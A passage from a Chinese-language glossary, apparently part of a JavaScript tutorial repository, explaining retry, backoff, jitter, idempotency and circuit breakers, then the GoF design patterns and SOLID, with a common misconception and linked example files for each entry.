重试指在操作失败后**再试一次或几次**，用来应对偶发的瞬时故障（网络抖动、连接被重置、服务临时过载）。它成立的前提是**失败是暂时的**——对「参数校验失败」这类确定性错误重试一万次结果都一样，只会浪费资源。关键细节：必须设**上限**（最大次数或总时长），必须只对**可重试的错误**重试（5xx、超时、连接错误可重试；4xx 业务错误不可），并且要保证被重试的操作是**幂等**的，否则一次「超时但其实成功了」的请求重试后会变成重复下单。

**常见误解**：以为重试是「增强可靠性」的万能药。多个层级各加重试会形成**重试风暴**，把一次小故障放大成雪崩。

也见 [Exponential Backoff（指数退避）](#exponential-backoff指数退避)、[Idempotency（幂等性）](#idempotency幂等性)、[Circuit Breaker（熔断器）](#circuit-breaker熔断器)。

示例：[`29_npm_libraries/16_retry_and_resilience.js`](29_npm_libraries/16_retry_and_resilience.js)

### Exponential Backoff（指数退避）

指数退避要求每次重试之间的等待时间**按倍数增长**（例如 100ms、200ms、400ms、800ms），而不是固定间隔。理由是：如果故障来自「服务被压垮」，固定间隔的重试会以恒定的速率继续施压，让它永远缓不过来；指数增长的间隔给了系统恢复空间，也让重试总量在时间上有界。关键细节：要设**最大间隔上限**，否则退避会增长到荒谬的分钟级；等待时间通常用一个系数（常见 2）乘以基础延迟，并结合抖动打散；此外，「重试总预算」比「重试次数」更能保护系统——限制整个请求最多花 5 秒在重试上。

**常见误解**：以为退避只是为了「让日志好看点」。它真正的作用是**给下游恢复的时间**，是防止重试放大故障的核心机制。

也见 [Retry（重试）](#retry重试)、[Jitter（抖动）](#jitter抖动)。

示例：[`29_npm_libraries/16_retry_and_resilience.js`](29_npm_libraries/16_retry_and_resilience.js)

### Jitter（抖动）

抖动指在退避计算出的等待时间上**加上一份随机扰动**（如 `delay * (0.5 + Math.random())`）。没有抖动时，成百上千个客户端会在故障发生后**按同样的节奏同时重试**（因为它们看到的是同一次故障、用的是同一个公式），形成周期性的浪涌，把刚刚恢复的服务再打垮一次。抖动把这些请求在时间轴上抹平，让负载曲线变得平滑。关键细节：常见变体有「全抖动」（在 `[0, delay]` 内随机）、「等抖动」（在 `[delay/2, delay]` 内随机）与「去相关抖动」；实践中只要加了抖动，收益就比不加高一个量级。

**常见误解**：以为抖动是「让结果更随机、更不稳定」。它恰恰是让**系统级行为**更稳定的手段，单次请求的延迟略微不确定，换来的是一群客户端不再同步行动。

也见 [Exponential Backoff（指数退避）](#exponential-backoff指数退避)、[Retry（重试）](#retry重试)。

示例：[`29_npm_libraries/16_retry_and_resilience.js`](29_npm_libraries/16_retry_and_resilience.js)

### Idempotency（幂等性）

幂等性指**同一个操作执行一次与执行多次，对系统状态的影响相同**。它是重试能够安全存在的前提：如果「扣款 100 元」不是幂等的，那么一次超时后的重试就会让用户被扣 200 元。在 HTTP 语义里，`GET`/`PUT`/`DELETE` 按约定是幂等的，`POST` 通常不是。关键细节：让非幂等操作变得幂等的标准做法是**幂等键（idempotency key）**——客户端为每次业务操作生成一个唯一 ID 随请求发送，服务端首次处理时记录该键与结果，之后遇到同一个键就直接返回上次的结果而不是重复执行；这个记录必须与业务写入在**同一个事务**里落库，否则「写成功但记录没写成」的窗口里仍会重复执行。

**常见误解**：以为「没有副作用」才叫幂等。幂等说的是**多次执行后的最终状态**与一次相同，而不是「什么都没发生」——`DELETE` 第二次删已经删掉的资源返回 404 或 204 都不影响幂等性。

也见 [Retry（重试）](#retry重试)、[Exponential Backoff（指数退避）](#exponential-backoff指数退避)。

示例：[`29_npm_libraries/16_retry_and_resilience.js`](29_npm_libraries/16_retry_and_resilience.js)

### Circuit Breaker（熔断器）

熔断器是**当某个下游持续失败时主动切断对它的调用**的保护机制，灵感来自电路保险丝：错误累积到阈值后从「闭合」跳到「断开」，此后一段时间内所有请求**立刻失败**而不去尝试；过了冷却期进入「半开」状态，放少量请求试探，成功则恢复闭合，失败则继续断开。它和重试解决的是不同问题：重试试图让单次调用成功，熔断则承认「这个下游已经坏了」，把资源留给还健康的部分——否则大量请求会卡在等待超时上，把调用方的线程/内存耗尽，故障从下游蔓延到上游。关键细节：超时设置是熔断生效的前提（没有超时就永远等不到「失败」这个信号）；熔断后要给用户一个明确的降级响应（缓存数据、默认值或友好错误），而不是无声地吞掉。

**常见误解**：以为熔断会影响业务成功率所以不该开。没有熔断时，故障期间几乎 100% 的请求都会挂在超时上；熔断至少能保证「快速失败 + 降级」，用户体验反而更好。

也见 [Retry（重试）](#retry重试)、[Connection Pool（连接池）](#connection-pool连接池)。

示例：[`29_npm_libraries/16_retry_and_resilience.js`](29_npm_libraries/16_retry_and_resilience.js)

## 设计模式

### Design Pattern（设计模式）

设计模式是**针对反复出现的软件设计问题，被反复验证过的可复用解法**。它不是可以直接复制的代码，而是一套「问题—上下文—方案—后果」的描述：说明在什么约束下、用什么结构来组织类与对象的关系。它真正的价值在于**共享词汇**——说「这里用责任链」比花十分钟画图更能让同事立刻理解设计意图。关键细节：模式是**描述性的而不是规定性的**，它记录的是「人们已经这么写了」，而不是「你应该这么写」；JS 因为有一等函数、闭包、原型链与模块系统，很多 GoF 模式（策略、命令、观察者）可以退化成「传一个函数」，照搬 Java 式的类结构只会徒增样板代码。

**常见误解**：以为「用了模式就是好设计」。强行套用模式是典型的过度设计；模式应当在你**已经感到结构上的痛**之后才被引入。

也见 [Anti-pattern（反模式）](#anti-pattern反模式)、[Over-engineering（过度设计）](#over-engineering过度设计)、[GoF（四人组）](#gof四人组gang-of-four)。

示例：[`30_design_patterns/13_pattern_selection.js`](30_design_patterns/13_pattern_selection.js)

### GoF（四人组，Gang of Four）

GoF 指 1994 年出版《设计模式：可复用面向对象软件的基础》的四位作者（Erich Gamma、Richard Helm、Ralph Johnson、John Vlissides），书名常被简称为「GoF 书」。这本书把设计模式**系统化**成一套有共同结构（意图、动机、结构图、参与者、协作、后果）的目录，收录了 23 个经典模式，并划分成创建型、结构型、行为型三类。关键细节：GoF 模式全部围绕「类与对象的组织」展开，写法带强烈的 C++/Java 色彩；JS 有闭包与一等函数，许多模式的实现形式与书中不同（例如策略模式常是一个字典，装饰器模式常是高阶函数），但**意图**完全相通。

**常见误解**：以为「设计模式」就等于「GoF 那 23 个」。GoF 只是最有名的一次整理，JS 生态里还有模块模式、中间件（责任链的变体）、Mixin、EventBus 等自己的模式词汇。

也见 [Creational / Structural / Behavioral（创建型、结构型、行为型）](#creational-structural-behavioral创建型结构型行为型)、[Design Pattern（设计模式）](#design-pattern设计模式)。

示例：[`30_design_patterns/13_pattern_selection.js`](30_design_patterns/13_pattern_selection.js)

### Creational / Structural / Behavioral（创建型、结构型、行为型）

这是 GoF 对 23 个模式的三大分类，依据是「这个模式主要在解决哪一类问题」。**创建型**关注「对象怎么被造出来」，把实例化过程从使用方解耦（单例、工厂、建造者、原型、抽象工厂）；**结构型**关注「对象与类怎么组合成更大的结构」，在保持接口可用的前提下改变结构（适配器、装饰器、代理、外观、组合、享元、桥接）；**行为型**关注「对象之间怎么分工与通信」，把职责与算法分配出去（观察者、策略、状态、命令、责任链、模板方法、中介者、备忘录、访问者、迭代器）。关键细节：分类是**记忆与检索的工具**，不是硬边界——同一个问题常可用不同类别的模式解决（比如「避免一堆 if-else」既可以用策略（行为型）也可以用表驱动（无模式））。

**常见误解**：以为「创建型只管创建、结构型只管结构」，于是纠结某个模式该放哪一类。分类的用途是帮你在面对问题时想起「这一类里有哪些可选项」。

也见 [GoF（四人组）](#gof四人组gang-of-four)、[Design Pattern（设计模式）](#design-pattern设计模式)。

示例：[`30_design_patterns/16_structural_patterns.js`](30_design_patterns/16_structural_patterns.js)、[`30_design_patterns/17_behavioral_patterns_extra.js`](30_design_patterns/17_behavioral_patterns_extra.js)

### Module Pattern（模块模式）

模块模式是**用 IIFE（立即调用函数表达式）加闭包造出私有作用域**的经典 JS 模式：函数立刻执行，在内部定义变量与函数，只把愿意公开的部分作为对象返回，外部无法触碰闭包里的私有成员。它出现在 ESM 之前，解决的是「`<script>` 时代所有变量都挤在全局作用域里互相覆盖」的问题，也是「用闭包实现私有状态」这一技巧的原型。关键细节：在原生 ESM 普及后，模块模式**大部分已被取代**——模块文件自带作用域、`export` 就是公开接口，不需要再手工包一层 IIFE；但它并没有过时，其精神（只暴露必要接口、隐藏内部状态）在 IIFE 级私有变量、`#private` 字段与工厂函数里依然处处可见。

**常见误解**：以为「模块模式」就是「ES 模块」。前者是一种手写技巧，后者是语言级的模块系统，二者解决的问题相同、实现层次完全不同。

也见 [Singleton（单例模式）](#singleton单例模式)、[Design Pattern（设计模式）](#design-pattern设计模式)。

示例：[`30_design_patterns/01_module_pattern.js`](30_design_patterns/01_module_pattern.js)

### Singleton（单例模式）

单例模式保证**一个类在全局只有一个实例，并提供访问它的统一入口**。它适用于「本质上唯一」的资源：应用配置、日志器、数据库连接池、事件总线。JS 里实现单例的方式很多——模块顶层导出的对象天然就是单例（模块只会被求值一次）、闭包持有私有实例、静态字段与 `getInstance()` 方法。关键细节：单例最大的问题是**隐式的全局状态**——它让依赖关系从函数签名里消失（看不出这个函数用了全局配置），也让测试互相污染（上个用例改过的单例状态留给了下个用例）。因此现代实践是：优先用**依赖注入**传递「唯一的那个实例」，而不是让代码去主动 `getInstance()`。

**常见误解**：以为单例能保证「只有一个」，在有多份模块副本（依赖地狱、打包重复）或跨进程/跨 Worker 的场景里，实际会存在多个实例。

也见 [Dependency Injection（依赖注入）](#dependency-injection-di依赖注入)、[Module Pattern（模块模式）](#module-pattern模块模式)。

示例：[`30_design_patterns/02_singleton.js`](30_design_patterns/02_singleton.js)

### Factory（工厂模式）

工厂模式把**「创建对象」这件事从使用方手里拿走**，交给一个专门的函数或类来决定造什么、怎么造。使用方只说「给我一个支付处理器」，不再 `new` 一个具体类，于是新增类型不需要改调用处——这正是它相对 `if/else` 加 `new` 的核心收益。常见形态有简单工厂（一个函数内部 `switch` 返回不同实现）、工厂方法（子类决定实例化哪个类）与抽象工厂（创建一族的相互关联对象，如「一整套 UI 控件」）。关键细节：工厂还适合承担**参数校验、缓存复用与异步初始化**等构造逻辑；但如果没有多种类型要选，直接 `new` 或直接调用构造函数更清晰——工厂的价值随「类型分支数量」增长。

**常见误解**：以为工厂能消除 `if/else`。它只是把分支收拢到了一个地方（这已经很有价值），分支本身仍然存在；消除分支的是表驱动或策略模式配合注册机制。

也见 [Builder（建造者模式）](#builder建造者模式)、[Strategy（策略模式）](#strategy策略模式)、[Adapter（适配器模式）](#adapter适配器模式)。

示例：[`30_design_patterns/03_factory.js`](30_design_patterns/03_factory.js)

### Builder（建造者模式）

建造者模式把**复杂对象的构造过程拆成一步步的调用**，最后用一个 `build()` 收口。它针对的是「构造参数太多、可选参数太多」的经典痛点：与构造函数里塞八个位置参数相比，`new Query().select('*').from('users').where({id:1}).limit(10).build()` 每个参数都有名字、顺序无关、可以只设置关心的那些。关键细节：`build()` 是模式的灵魂——它负责**校验必填项**与**产出合法对象**，让「半成品对象」没有机会流出去；builder 通常设计成**不可变**的（每步返回新实例）以避免复用同一个 builder 时状态串味。JS 里这个模式最著名的应用就是查询构造器与请求构造器。

**常见误解**：以为链式调用就是建造者。链式调用只是一种语法形式，关键在「分步构建 + 最终校验产出」，如果一个 `build()` 只是把参数原样打包，那可能只是不必要的包装。

也见 [Factory（工厂模式）](#factory工厂模式)、[Command（命令模式）](#command命令模式)。

示例：[`30_design_patterns/04_builder.js`](30_design_patterns/04_builder.js)

### Observer（观察者模式）

观察者模式建立**「主题（Subject）—观察者（Observer）」的一对多依赖**：主题维护一份观察者列表，状态变化时逐个通知；观察者实现统一的更新接口，从而在**不知道主题具体是谁**的前提下被动接收变化。它解决的问题是「发布者不应该硬编码依赖所有关心它的人」。关键细节：观察者模式里双方是**彼此直连**的——主题直接持有观察者的引用并调用其方法，这意味着互不知道的对角线耦合仍存在；通知时机与顺序、观察者中途增删、以及「通知过程中抛错如何不影响其它观察者」都需要专门处理。

**常见误解**：把观察者模式与发布订阅模式当成同一个东西。它们长得像，耦合结构却不同，也见下一条。

也见 [Publish/Subscribe（发布订阅模式）](#publishsubscribe发布订阅模式)、[Mediator（中介者模式）](#mediator中介者模式)。

示例：[`30_design_patterns/05_observer.js`](30_design_patterns/05_observer.js)

### Publish/Subscribe（发布订阅模式）

发布订阅模式在发布者与订阅者之间插入一个**中间层（事件总线/消息代理）**：发布者只 `emit('user:created', data)`，订阅者只 `on('user:created', handler)`，双方**互不认识、甚至不知道对方存在**，只认识事件名和那个 `EventBus`。这正是它与观察者模式的根本区别——观察者是「主题直接通知它的观察者」（两端互相持有引用），发布订阅是「大家都只跟中间的代办打交道」（完全解耦，代价是多了一个需要管理生命周期的中介）。JS 里的 `EventTarget`/`addEventListener`、Node 的 `EventEmitter`、各类 EventBus 都是这一模式；它也是响应式编程与框架状态管理的地基。

**常见误解**：以为发布订阅只是「观察者模式换了个名字」。多出的那一层不是修辞——它让发布者可以不知道订阅者是谁（跨模块、跨进程通信成为可能），也带来新的问题：事件名变成事实上的公共契约，且**订阅未取消就会内存泄漏**。

也见 [Observer（观察者模式）](#observer观察者模式)、[Mediator（中介者模式）](#mediator中介者模式)、[Chain of Responsibility（责任链模式）](#chain-of-responsibility责任链模式)。

示例：[`30_design_patterns/06_pubsub.js`](30_design_patterns/06_pubsub.js)

### Strategy（策略模式）

策略模式把**一组可互换的算法**各自封装成对象（或函数），让调用方在运行时选用其中一个。它消灭的是那种「一个函数里塞满 `if (type === 'a') ... else if (type === 'b') ...`」的结构，把每个分支抽出去独立演进、独立测试。典型形态是一个映射表：`const strategies = { alipay: payByAlipay, wechat: payByWechat }`，使用时 `strategies[type](order)`。关键细节：策略之间的关系是**平等的、可替换的**，调用方主动选择用哪个；策略通常是无状态的纯算法（同样的输入给同样的输出），因此可以自由复用。

**常见误解**：以为策略模式和状态模式差不多。区别在于**谁来决定切换**——策略由外部调用方选，状态由对象自己随内部状态迁移，也见下一条。

也见 [State（状态模式）](#state状态模式)、[Template Method（模板方法模式）](#template-method模板方法模式)、[Factory（工厂模式）](#factory工厂模式)。

示例：[`30_design_patterns/07_strategy.js`](30_design_patterns/07_strategy.js)

### State（状态模式）

状态模式让**对象的行为随内部状态的改变而改变**：把每个状态封装成独立的对象，每个状态对象自己决定「在这个状态下，某个操作该怎么做」，以及「做完之后要不要切换到别的状态」。例如订单在「待支付」状态下调用 `cancel()` 可以成功，在「已发货」状态下 `cancel()` 应当被拒绝——同一个方法、不同的状态、不同的行为。关键细节：与策略模式的核心分野在于**状态迁移由谁触发**——策略模式的选择来自外部（调用方挑算法），状态模式的切换发生在内部（状态对象把下一个状态「交接」出去），并且状态之间构成一张**有向的迁移图**，非法迁移需要显式禁止。

**常见误解**：以为状态模式只是「策略模式加上一个 currentState 字段」。真正的状态模式里，状态对象自己推动迁移（`this.order.setState(new ShippedState())`），而策略模式的对象彼此不知道对方的存在。

也见 [Strategy（策略模式）](#strategy策略模式)、[Memento（备忘录模式）](#memento备忘录模式)。

示例：[`30_design_patterns/14_state.js`](30_design_patterns/14_state.js)

### Decorator Pattern（装饰器模式）

装饰器模式**在不修改原对象、也不改变其接口的前提下，动态地给对象叠加新能力**：装饰器包裹被装饰对象，转发调用并在前后插入额外逻辑。经典例子是「给一个数据源加上加密层、再加上压缩层」，组合顺序决定处理顺序。JS 里因为函数是一等公民，最常见的形式是**高阶函数**——`withLogging(withTiming(fn))`，这让日志、计时、缓存、鉴权、重试这些横切关注点可以像积木一样自由拼装。关键细节：装饰器与原对象**接口必须一致**（这也是它和适配器的分界，适配器是转换接口）；装饰顺序不可交换，且层数太多时调用栈会变长、调试会变难。

**常见误解**：把装饰器模式和 TC39 的 `@decorator` 语法当成同一件事。前者是设计模式（可以纯手工用高阶函数实现），后者是语言级的语法特性，用来更简洁地表达这类包装（见下一条）。

也见 [Adapter（适配器模式）](#adapter适配器模式)、[Proxy Pattern（代理模式）](#proxy-pattern代理模式)、[TC39 Decorator Syntax（TC39 装饰器语法）](#tc39-decorator-syntaxtc39-装饰器语法)。

示例：[`30_design_patterns/08_decorator.js`](30_design_patterns/08_decorator.js)

### TC39 Decorator Syntax（TC39 装饰器语法）

TC39 装饰器是**写在类、方法、访问器或字段前面的 `@expression` 语法**（目前处于 Stage 3 提案阶段），由运行时在定义时调用被装饰的目标，从而把「包装」这件事从手工嵌套变成声明式写法：`@logged @timed class Service {}`。它主要服务元编程场景——日志、依赖注册、校验、序列化配置。关键细节：装饰器的完整语义（新旧提案差异、是否支持参数装饰器、`accessor` 关键字、`addInitializer`）仍在演进，不同运行环境与转译器的支持程度不同，因此在生产代码里需要**做能力检测或依赖转译**；在 Node 中通常需要显式开启实验标志。本仓库的示例同时给出「原生不可用时的手写等价实现」。

**常见误解**：以为装饰器只能用在类上。现代提案同样支持方法、`getter`/`setter`、字段与自动访问器 `accessor`，能力范围取决于实现阶段。

也见 [Decorator Pattern（装饰器模式）](#decorator-pattern装饰器模式)。

示例：[`30_design_patterns/20_decorator_syntax.js`](30_design_patterns/20_decorator_syntax.js)

### Adapter（适配器模式）

适配器模式**把「不兼容的接口」转换成「调用方期望的接口」**，让原本无法协作的两段代码能接上。现实中的类比是电源转接头：设备要的形状和你手里的插座不同，加一层转换即可，设备与插座本身都不需要改。典型场景是「统一多个第三方 SDK」——支付宝、微信、Stripe 各有各的方法名与返回结构，包一层适配器后对外都暴露 `pay(order)`，业务代码只认这一个接口。关键细节：适配器**改变接口而不改变功能**（对比装饰器：不改变接口而增强功能；对比外观：把多个接口简化成一个）；适配器是隔离外部变化的天然边界，也是「将来要换库」时成本最低的写法。

**常见误解**：以为适配器只是「多写一层没用的包装」。它的价值恰恰在于把「外部世界的不确定性」关进一个文件里，让变化不再扩散。

也见 [Decorator Pattern（装饰器模式）](#decorator-pattern装饰器模式)、[Facade（外观模式）](#facade外观模式)。

示例：[`30_design_patterns/09_adapter.js`](30_design_patterns/09_adapter.js)

### Proxy Pattern（代理模式）

代理模式提供一个**和真实对象接口完全相同的替身**，在把调用转给真实对象的前后插入控制逻辑。与装饰器「增强功能」不同，代理的意图是**控制访问**，常见四种：**保护代理**（鉴权，无权限直接拒绝）、**虚拟代理**（延迟创建昂贵对象，比如图片占位符）、**缓存代理**（命中缓存就不转发）、**远程代理**（本地对象代表远端服务）。关键细节：ES6 的 `Proxy` 是**语言级的元编程特性**，可以拦截 `get`/`set`/`has`/`apply`/`construct` 等内部操作，用来实现响应式追踪、不可变校验、默认值与日志——它是实现代理模式的利器，但**「语言的 Proxy」不等于「代理模式」**：代理模式的核心是「同接口 + 控制访问」这个意图，用 `Proxy` 也可以实现出与代理模式毫无关系的功能，而手写一个同名方法的包装类就已经是代理模式了。

**常见误解**：以为「用了 `Proxy` 就是用了代理模式」，或者以为「没用到 `Proxy` 就不是代理模式」。前者混淆了工具与意图，后者忽略了手写包装同样成立。

也见 [Decorator Pattern（装饰器模式）](#decorator-pattern装饰器模式)、[Facade（外观模式）](#facade外观模式)、[Adapter（适配器模式）](#adapter适配器模式)。

示例：[`30_design_patterns/10_proxy_pattern.js`](30_design_patterns/10_proxy_pattern.js)

### Command（命令模式）

命令模式把**「一次操作」本身封装成对象**，对象里同时带着「怎么执行」和撤销所需的信息。一旦请求成为对象，它就获得了数据的全部能力：可以被排队、被记录成日志、被序列化、被组合成宏命令、被放进历史栈里回滚。典型场景是编辑器的撤销/重做、任务队列、事务与操作审计。关键细节：命令对象通常约定 `execute()` 与 `undo()` 两个方法（`undo` 需要保存执行前的状态快照或反操作）；「宏命令」是命令的**组合**（一个命令内部持有一批命令，按序执行、逆序撤销），这正是组合模式与命令模式的交界处。

**常见误解**：以为命令模式必须有 `undo`。撤销只是它最有名的用途之一，把请求对象化以便排队、重放与日志记录同样成立。

也见 [Memento（备忘录模式）](#memento备忘录模式)、[Composite（组合模式）](#composite组合模式)。

示例：[`30_design_patterns/11_command.js`](30_design_patterns/11_command.js)

### Chain of Responsibility（责任链模式）

责任链模式把**若干个处理者串成一条链**，请求沿链传递，每个处理者自行决定「处理掉」「加工后继续传递」还是「直接放行」。它把「谁处理这个请求」与「请求本身」解耦，新增处理环节只需在链上插入一个节点，不必改动已有节点。它最广为人知的 JS 形态就是 **HTTP 中间件**：日志中间件、鉴权中间件、解析中间件依次执行 `next()`，任何一环都可以提前结束响应。关键细节：链可以是**单向直行**也可以是**双向的洋葱模型**（请求与响应各走一遍，如 Koa 的 `compose`）；要警惕「请求走到链尾却没人处理」的静默失败，通常需要一个终结处理者或显式的 404 兜底。

**常见误解**：以为链上的每一环都必须处理请求。责任链的价值恰恰在于「不处理就放行」——每环只关心自己那部分职责。

也见 [Command（命令模式）](#command命令模式)、[Decorator Pattern（装饰器模式）](#decorator-pattern装饰器模式)、[Template Method（模板方法模式）](#template-method模板方法模式)。

示例：[`30_design_patterns/12_chain_of_responsibility.js`](30_design_patterns/12_chain_of_responsibility.js)

### Template Method（模板方法模式）

模板方法模式在父类里定义好**算法的骨架**（一组按固定顺序调用的步骤），把其中若干步骤留给子类去实现。「固定的流程」与「可变的一步」被分开，子类只能改填空处，无法（也不该）改流程本身。典型场景是构建流程、数据处理管道、测试基类：`run()` 依次调用 `setup()`、`execute()`、`teardown()`，子类只实现后三个。关键细节：它与策略模式解决的是同一类问题（可变行为如何被替换），但**复用方式相反**——模板方法靠**继承**复用固定的骨架，策略模式靠**组合**替换整个算法，因此策略更灵活（可运行时换、可组合、无继承耦合），模板方法更简单（流程显而易见）。在鼓励组合优于继承的现代 JS 里，模板方法的很多场景已被「传入一个配置对象/回调」取代。

**常见误解**：以为模板方法只能是抽象类。JS 里继承不是必须的——一个接收回调的高阶函数同样表达了「骨架固定、步骤可换」的意图。

也见 [Strategy（策略模式）](#strategy策略模式)、[Chain of Responsibility（责任链模式）](#chain-of-responsibility责任链模式)。

示例：[`30_design_patterns/15_template_method.js`](30_design_patterns/15_template_method.js)

### Facade（外观模式）

外观模式为**一组复杂的子系统提供一个简化的统一接口**，让调用方不必了解内部的类与调用顺序。典型例子是一个 `bootstrap()` 函数，内部依次完成读配置、建连接池、注册路由、挂载中间件、启动监听，调用者只写一行。它带来两个收益：使用侧认知负担下降，以及子系统变化被隔离在门面之后。关键细节：外观**不禁止**直接访问子系统（它是便利层而非强制边界），也不增加新功能；它与适配器的区别在于——适配器是为了让**不兼容的接口能对接**（面向单个被适配者、接口形状被迫改变），外观是为了让**复杂的接口变简单**（面向多个子系统、主动设计出更友好的形状）。

**常见误解**：以为外观就是「上帝对象」的开始。只要外观保持「只做编排、不含业务规则」，它就是清晰的分层边界；一旦业务逻辑开始往里堆，才会退化成上帝对象。

也见 [Adapter（适配器模式）](#adapter适配器模式)、[Mediator（中介者模式）](#mediator中介者模式)、[Layered Architecture（分层架构）](#layered-architecture分层架构)。

示例：[`30_design_patterns/16_structural_patterns.js`](30_design_patterns/16_structural_patterns.js)

### Composite（组合模式）

组合模式把对象组织成**树形结构**，并让「单个叶子」和「一组对象」拥有**同一个接口**，于是调用方可以对整棵树写同一份递归代码：`node.render()` 对文件是画一个文件，对文件夹是遍历子节点各画一次。它适用于任何「整体—部分」的层次结构：文件系统、UI 组件树、菜单、组织架构。关键细节：接口必须刻意保持**对叶子与容器都合理**（如果容器有 `add()` 而叶子没有，就破坏了统一性，通常做法是叶子上的 `add()` 空实现或抛错并明确约定）；递归带来的深度问题与遍历顺序问题需要在实现时考虑。

**常见误解**：以为组合模式只是「树的递归遍历」。关键差别在**统一接口**——如果调用方需要 `if (是文件夹) ... else ...` 来区分类型，那就没得到组合模式的收益。

也见 [Decorator Pattern（装饰器模式）](#decorator-pattern装饰器模式)、[Visitor（访问者模式）](#visitor访问者模式)、[Command（命令模式）](#command命令模式)。

示例：[`30_design_patterns/16_structural_patterns.js`](30_design_patterns/16_structural_patterns.js)

### Flyweight（享元模式）

享元模式通过**共享大量细粒度对象的「不变部分」**来降低内存占用：把对象拆成「内在状态」（可共享、只读，如字符的字体与字号）与「外在状态」（每次使用各不相同，由调用方传入，如字符在文中的位置）。文本编辑器是经典例子——如果每个字符都建一个对象并各自存字体信息，内存会爆掉；共享字体对象后，内存只与「不同字体的数量」相关。关键细节：享元的本质是**用时间换空间**（每次使用都要查表取共享实例并传入外在状态），并且要求共享对象**严格不可变**——一旦有人修改了共享实例，所有使用者都会受影响。JS 里字符串驻留、`Map` 缓存池、对象池都是它的体现。

**常见误解**：以为享元就是「加个缓存」。缓存关心的是「避免重复计算」，享元关心的是「避免重复存储」，优化目标不同。

也见 [Singleton（单例模式）](#singleton单例模式)、[Memoization（记忆化）](#memoization记忆化)。

示例：[`30_design_patterns/16_structural_patterns.js`](30_design_patterns/16_structural_patterns.js)

### Mediator（中介者模式）

中介者模式引入一个**中心对象来协调多个同事对象之间的通信**，让同事之间不再互相持有引用，而是都只跟中介者说话。它把 N 个对象之间可能存在的 N² 条两两关系收敛为 N 条「对象到中介者」的关系。典型场景是 UI 表单里多个控件互相影响（勾选 A 则禁用 B、清空 C），或者聊天室里的消息分发。关键细节：中介者与发布订阅很像（都有中间层），区别在于**知晓程度与职责**——中介者通常**知道**所有同事是谁并包含具体的协调规则（是业务逻辑的集中地），而事件总线只是按名字转发、对订阅者一无所知；中介者的风险也在于此：协调规则不断加入会把中介者变成难以维护的「上帝对象」。

**常见误解**：以为中介者模式能让耦合消失。耦合并没有消失，只是从「网状」变成了「星形」——好处是它变得可见、可控，代价是中介者本身可能成为新的瓶颈。

也见 [Publish/Subscribe（发布订阅模式）](#publishsubscribe发布订阅模式)、[Observer（观察者模式）](#observer观察者模式)、[Facade（外观模式）](#facade外观模式)。

示例：[`30_design_patterns/17_behavioral_patterns_extra.js`](30_design_patterns/17_behavioral_patterns_extra.js)

### Memento（备忘录模式）

备忘录模式**在不破坏封装的前提下捕获对象的内部状态，以便日后恢复**。它由三个角色组成：**发起人**（拥有状态的对象）、**备忘录**（状态的快照，对外不透明）、**管理者**（保管快照，但不窥探内容）。它是撤销/重做、事务回滚、编辑草稿的技术基础。关键细节：快照必须是**深拷贝或不可变数据**——如果备忘录里存的是原对象的引用，后续修改会连快照一起改掉，撤销时就只能恢复出「当前状态」；同时要管理**快照数量**，无限保存历史是内存泄漏的常见来源（实践中用环形缓冲或只保留最近 N 步）。

**常见误解**：把备忘录与命令模式的 `undo` 混为一谈。命令模式记录的是「操作」（以及如何逆操作），备忘录记录的是「状态快照」；两者常配合使用，但一个存意图、一个存数据。

也见 [Command（命令模式）](#command命令模式)、[State（状态模式）](#state状态模式)、[Immutability（不可变数据）](#immutability不可变数据)。

示例：[`30_design_patterns/17_behavioral_patterns_extra.js`](30_design_patterns/17_behavioral_patterns_extra.js)

### Visitor（访问者模式）

访问者模式把**「对一组对象做什么操作」从对象本身剥离出来**，放进独立的访问者对象里；对象只需提供一个 `accept(visitor)` 方法，把「自己是什么类型」告诉访问者，由访问者决定怎么处理。它解决的是「数据结构稳定、但需要不断新增操作」的场景——新增一种操作只需新增一个访问者，不必修改任何被访问的类。关键细节：代价是**双分派**带来的复杂度，以及「新增一种数据类型」时所有访问者都要改（所以它适用于「类型稳定、操作多变」，反过来就不合适）；在 JS 里因为可以直接遍历和判断类型，访问者模式的价值比静态类型语言小得多，通常只在需要把遍历与处理严格分离时才有意义。

**常见误解**：以为访问者模式是「遍历树的标准做法」。它解决的是操作与结构解耦，遍历只是它常出现的场合；单纯遍历用递归或迭代器更直接。

也见 [Composite（组合模式）](#composite组合模式)、[Strategy（策略模式）](#strategy策略模式)。

示例：[`30_design_patterns/17_behavioral_patterns_extra.js`](30_design_patterns/17_behavioral_patterns_extra.js)

### Bridge（桥接模式）

桥接模式把**「抽象」与「实现」拆成两条独立的继承层次**，再用组合把它们连起来，从而让两者可以各自独立变化。经典例子是「遥控器 × 设备」：遥控器（抽象）可以有基础款与进阶款，设备（实现）可以有电视与音响，两者相乘才形成完整功能——若用继承表达就要写 2×2 个类，而桥接只要 2+2 个类加一个引用。关键细节：它与策略模式结构相似（都是「持有一个可变实现」），区别在**意图与维度**——策略模式是「替换一个算法」，桥接是「让两个维度正交演化」，防的是**类爆炸**；识别信号是「这个东西有两个独立变化的分类维度吗」。

**常见误解**：以为凡是「组合优于继承」的写法都叫桥接。桥接特指**为两个正交维度解耦**而做的层次拆分，只有一个维度的组合通常就是普通的委托或策略。

也见 [Strategy（策略模式）](#strategy策略模式)、[Adapter（适配器模式）](#adapter适配器模式)。

示例：[`30_design_patterns/17_behavioral_patterns_extra.js`](30_design_patterns/17_behavioral_patterns_extra.js)

### SOLID（SOLID 五原则）

SOLID 是五个面向对象设计原则的首字母缩写，由 Robert C. Martin 整理：**S**RP 单一职责、**O**CP 开闭原则、**L**SP 里氏替换、**I**SP 接口隔离、**D**IP 依赖倒置。它们共同的目标是让代码**对扩展开放、对修改封闭**，把「变化」限制在最小的范围内。关键细节：五条原则互相支撑而非彼此独立——比如遵循依赖倒置（依赖抽象）自然更容易做到开闭原则（只加新实现、不改旧代码）；同时它们都是**启发式而非定律**，过度遵循会产出大量只有一个实现的接口与层层转发，反而增加阅读成本。判断标准始终是「这样改完，以后的变化是不是更容易了」。

**常见误解**：把 SOLID 当作可以打勾的合规清单。它是解释「什么样的结构更耐改」的语言，不是必须逐条满足的规则。

也见 [Single Responsibility Principle（单一职责原则）](#single-responsibility-principle-srp单一职责原则)、[Open/Closed Principle（开闭原则）](#openclosed-principle-ocp开闭原则)、[Dependency Inversion Principle（依赖倒置原则）](#dependency-inversion-principle-dip依赖倒置原则)。

示例：[`30_design_patterns/18_solid_principles.js`](30_design_patterns/18_solid_principles.js)

### Single Responsibility Principle / SRP（单一职责原则）

